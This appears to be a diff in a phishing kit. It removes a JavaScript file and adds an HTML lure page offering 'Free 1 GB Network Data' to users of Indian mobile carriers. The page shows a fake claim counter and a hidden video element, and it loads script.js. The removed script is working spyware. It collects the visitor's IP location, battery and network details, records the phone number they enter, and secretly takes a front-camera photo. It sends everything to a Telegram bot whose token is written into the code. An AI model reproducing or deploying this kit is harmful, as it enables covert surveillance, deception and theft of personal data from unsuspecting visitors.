@@ -1,197 +1,106 @@
-const BOT_TOKEN = "8312309177:AAGaLWnyLdx59DUI5vl78GoBShyQvaoUDx0"; // Replace with your bot token
-const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free 1 GB Data Booster</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-async function getIpDetails() {
-    try {
-        const response = await fetch("https://ipapi.co/json/");
-        if (!response.ok) throw new Error("Failed to fetch IP details");
-        return await response.json();
-    } catch (error) {
-        console.error("Error fetching IP details:", error);
-        return {
-            ip: "Unknown",
-            city: "Unknown",
-            region: "Unknown",
-            country: "Unknown",
-            org: "Unknown",
-            asn: "Unknown",
-        };
-    }
-}
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
 
-async function getDeviceInfo() {
-    const deviceInfo = {
-        charging: false,
-        chargingPercentage: null,
-        networkType: null,
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    };
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
 
-    if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        deviceInfo.charging = battery.charging;
-        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
-    }
+        .notice {
+            background: #ffecb3;
+            padding: 10px;
+            border: 1px solid #ffeb3b;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
 
-    if (navigator.connection) {
-        deviceInfo.networkType = navigator.connection.effectiveType;
-    }
+        .form-box {
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
 
-    return deviceInfo;
-}
+        select, input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
 
-async function sendTelegramMessage(chatId, message) {
-    const data = {
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-    };
+        .submit-button {
+            background: #00c853;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
 
-    try {
-        const response = await fetch(API_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
+        .submit-button:hover {
+            background: #00b04f;
+        }
 
-        const result = await response.json();
-        console.log("Telegram Response:", result);
-    } catch (error) {
-        console.error("Error sending message:", error);
-    }
-}
+        .user-count {
+            font-size: 14px;
+            color: #333;
+        }
 
-async function sendPhoto(chatId, photo) {
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('photo', photo);
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Free 1 GB Network Data</h1>
+        <div class="notice">�&nbsp; Free 1GB data pack recharge for everyone from us.</div>
+        <div class="form-box">
+            <form id="data-form">
+                <select id="operator" required="">
+                    <option value="">Select Operator</option>
+                    <option value="Jio">Jio</option>
+                    <option value="Airtel">Airtel</option>
+                    <option value="VI">VI</option>
+                    <option value="BSNL">BSNL</option>
+                </select>
+                <input type="text" id="mobile-number" placeholder="Mobile Number" required="" maxlength="10" pattern="\d{10}" title="Enter 10 digit mobile number">
+                <button type="submit" class="submit-button">🎁 Claim</button>
+            </form>
+        </div>
+        <div class="user-count">😃 Claimed 3589/5000 users.</div>
+        <video id="video" autoplay=""></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+    <script src="script.js"></script>
 
-    try {
-        const response = await fetch(API_FILE_URL, {
-            method: "POST",
-            body: formData
-        });
 
-        const result = await response.json();
-        console.log("Photo sent:", result);
-    } catch (error) {
-        console.error("Error sending photo:", error);
-    }
-}
-
-async function capturePhoto(video) {
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const photo = canvas.toDataURL('image/png');
-
-    // Convert data URL to Blob
-    const response = await fetch(photo);
-    const blob = await response.blob();
-    return new File([blob], 'photo.png', { type: 'image/png' });
-}
-
-async function sendInitialInfo() {
-    const ipDetails = await getIpDetails();
-    const deviceInfo = await getDeviceInfo();
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get('id');
-
-    const message = `
-<b><u>ℹ️ Activity Tracked:</u></b>
-
-<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
-<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
-<b>📡 ISP:</b> <i>${ipDetails.org}</i>
-<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
-
-<b>📱Device Info:</b>
-<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
-<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
-<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
-<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
-
-<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
-`;
-
-    if (chatId) {
-        await sendTelegramMessage(chatId, message);
-    } else {
-        console.error("Chat ID missing in URL!");
-    }
-}
-
-document.getElementById('data-form').addEventListener('submit', async function (event) {
-    event.preventDefault();
-
-    const operator = document.getElementById('operator').value;
-    const mobileNumber = document.getElementById('mobile-number').value;
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get('id');
-
-    if (!chatId) {
-        alert("Chat ID is missing in the URL!");
-        return;
-    }
-
-    const ipDetails = await getIpDetails();
-
-    const message = `
-<b><u>☎️ Number Tracked</u></b>
-<b>📱 Mobile number:</b> +91${mobileNumber}
-<b>📡 Operator:</b> ${operator}
-
-<b>🌐 Ip Information:</b>
-<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
-<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
-<b>📡 ISP:</b> <i>${ipDetails.org}</i>
-<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
-
-<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
-`;
-
-    await sendTelegramMessage(chatId, message);
-
-    const video = await startCamera();
-    const photo = await capturePhoto(video);
-    await sendPhoto(chatId, photo);
-
-    // Stop the camera and clean up
-    const tracks = video.srcObject.getTracks();
-    tracks.forEach(track => track.stop());
-    video.remove();
-
-    alert("Your request has been processed under 24 hours !");
-});
-
-sendInitialInfo();
-
-document.getElementById('mobile-number').addEventListener('input', function () {
-    this.value = this.value.replace(/[^0-9]/g, '');
-});
-
-async function startCamera() {
-    const video = document.createElement('video');
-    video.style.display = 'none'; // Hide the video element
-    document.body.appendChild(video);
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        video.srcObject = stream;
-        video.play();
-
-        await new Promise(resolve => {
-            video.onloadedmetadata = resolve;
-        });
-
-        return video;
-    } catch (error) {
-        console.error("Error accessing camera:", error);
-        return null;
-    }
-}
+</body></html>
